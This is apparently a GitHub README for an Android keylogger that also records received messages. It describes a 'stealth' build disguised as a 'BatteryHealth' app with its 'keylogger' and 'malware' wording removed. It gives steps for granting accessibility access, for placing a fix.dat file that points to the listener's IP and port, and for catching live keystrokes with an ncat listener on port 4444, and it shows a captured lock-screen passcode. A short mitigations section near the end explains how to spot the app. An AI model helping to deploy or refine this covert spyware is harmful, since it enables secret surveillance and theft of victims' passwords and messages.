# android-keylogger (also shows recieved messages)
![Screenshot_20230121_091918](https://user-images.githubusercontent.com/28081004/213873094-bc139731-67c2-4190-af5d-c57d3b4bdf6f.png)

project was originaly built in a AIDE (mobile app dev) using an old 2.2 gradle build on max api 21

this version was built in android studio electric eel 2022.1.1 with gradle updated to 7.6 and api all the way up to 33 (android 13)


# STEALTH

due to new security features android api 29 and above (oreo and up i believe) it will make it hard to near impossible to hide the app without root.
the stealth version does not allow the app to be open, just a white icon and it just opens the app details menu, sits in the app droor.

in stealth you must make and place your own fix.dat file in the app directory 
Android/data/com.BatteryHealth/files/key/fix.dat
after making fix.dat inside add "192.168.0.135:4444"
without the quotes and replace ip and port with your own ip:port

this option has removed all words "keylogger" and "malware" from UI and code as well as folders and hides the app 100% except setings installed list in
android BELLOW oreo, api 29 and up it will just open app info not showing the ip port field
![Screenshot_20230121_092852](https://user-images.githubusercontent.com/28081004/213873696-b7104b3c-7a17-46a5-a80d-11af8cfee183.png)
![Screenshot_20230121_092759](https://user-images.githubusercontent.com/28081004/213873716-8d0265db-4b4a-443f-8749-7549fa4f2f48.png)


# NORMAL INSTALL

open the app and just place your ip:port and tap send
you may need to open settings/apps/app-name then tap 3 dots top right and allow special permissions
make sure where you got the file from via web browser and or file manager has access, es works if you have problems
open accessibility settings and enable keylogger or BatteryHealth
no manual fix.dat required



# VIEWING LOGS
![Screenshot_20230121_092543](https://user-images.githubusercontent.com/28081004/213873151-b06c1b07-71cb-4c1d-89b9-d8416eeec27b.png)
see and record each key press in real time
open netcat and do


for windows use netcat 5.59 beta
.\ncat.exe -klvp 4444

just tells netcat to listen on port 4444 and not close

enjoy!



# ARE YOU'RE APPS VULNERABLE? TEST THEM NOW! example even CalyxOS locksceen is vulnerable, fennec's broswer url tab is protected but not web pages.
here is an example of a captured lock screen passcode 1337 and the garbled text is the dots temporarily shown but it still grabbed it.
![Screenshot_20230121_092116](https://user-images.githubusercontent.com/28081004/213873317-abffd551-46c0-44c6-a427-b0c6fe9051c4.png)

# dev
make a new android studio project, empty
file, open downloaded extracted project in new window
right click on each project to open each in file explorer
in youre new project open app\src\main and delete 
copy over the rev, java, main files from the forked project over to this folder

# mitigations

can i protect my passwords from this even while hacked?
open dev options and under privacy turn off show passwords when typed

how do i look for this

open accessibility settings and see if anything is on or just present, check installed apps in setings
on api 29 and above (oreo) it cannot fully hide the app from the launcher but stealth version shows white icon then only opens up app info
check app foders in android for a key folder or a fix.dat file






# Donate
If you've found my work to be valuable, I would greatly appreciate your support, please consider making a donation. Every little bit helps and allows me to keep creating and improving. Thank you for your consideration and support!
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/X8X6I1K9I)

<a href="https://www.buymeacoffee.com/KreaByte"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee <3&emoji=&slug=KreaByte&button_colour=BD5FFF&font_colour=ffffff&font_family=Comic&outline_colour=000000&coffee_colour=FFDD00" /></a>

# credits
forked from https://github.com/shivamsuyal/Android-Keylogger

icon "https://www.flaticon.com/free-icon/keylogger_8147179?term=keylogger&page=1&position=42&origin=search&related_id=8147179
      https://www.flaticon.com/free-icon/hacking_2431702?related_id=2431702&origin=search
      
      https://www.freepik.com/free-vector/cute-cat-computer-with-mouse-cartoon-vector-icon-illustration-animal-technology-icon-concept-isolated-premium-vector-flat-cartoon-style_18537569.htm#query=cat%20keyboard&position=1&from_view=search&track=sph#position=1&query=cat%20keyboard
      
https://www.freepik.com/free-vector/chat-bot-mobile-chatting-isometric-concept_6342161.htm?query=android&collectionId=1195&&position=37&from_view=collections#position=37
